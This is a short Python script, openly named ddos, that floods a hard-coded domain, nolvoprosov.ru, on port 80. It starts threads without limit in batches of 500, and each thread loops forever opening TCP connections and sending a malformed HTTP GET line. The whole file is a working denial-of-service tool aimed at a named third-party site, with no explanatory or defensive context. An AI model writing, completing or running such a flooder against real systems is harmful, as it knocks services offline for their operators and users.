import socket
import threading

target = "nolvoprosov.ru"
port = 80

def ddos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.close()
        except:
            pass

while True:
    for i in range(500):
        thread = threading.Thread(target=ddos)
        thread.start()
